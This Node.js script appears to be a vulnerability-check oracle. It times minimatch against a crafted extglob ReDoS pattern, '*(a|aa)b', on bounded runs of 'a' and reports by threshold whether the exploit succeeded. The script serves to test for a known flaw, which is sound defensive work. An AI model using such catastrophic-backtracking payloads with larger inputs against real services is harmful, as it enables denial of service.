const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint()) / 1e6;
}

function timedMatch(pattern, input) {
  const t0 = nowMs();
  const out = minimatch(input, pattern);
  const dt = nowMs() - t0;
  return { out, ms: dt };
}

try {
  // Benign operation first
  const benign = minimatch('file.js', '*.js');
  if (benign !== true) {
    throw new Error('benign minimatch failed');
  }

  operation_completed = true;

  // ReDoS probe: crafted extglob against non-matching long "a" run.
  // Keep bounded to avoid timeout while still showing vulnerable slowdown.
  const pattern = '*(a|aa)b';
  const smallInput = 'a'.repeat(18);
  const largeInput = 'a'.repeat(34);

  const small = timedMatch(pattern, smallInput);
  const large = timedMatch(pattern, largeInput);

  const ratio = large.ms / Math.max(0.001, small.ms);

  // Vulnerable versions show strong super-linear growth on this pattern.
  // Patched versions should not exhibit this magnitude.
  const exploitByRatio = ratio >= 8;
  const exploitByAbsolute = large.ms >= 25;
  exploit_succeeded = Boolean(exploitByRatio && exploitByAbsolute);

  evidence = JSON.stringify({
    benign_ok: true,
    pattern,
    small_len: smallInput.length,
    large_len: largeInput.length,
    small_ms: Number(small.ms.toFixed(4)),
    large_ms: Number(large.ms.toFixed(4)),
    ratio: Number(ratio.toFixed(3)),
    thresholds: { ratio_gte: 8, large_ms_gte: 25 },
    outputs: { small: small.out, large: large.out }
  });
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({
  operation_completed,
  exploit_succeeded,
  evidence
}));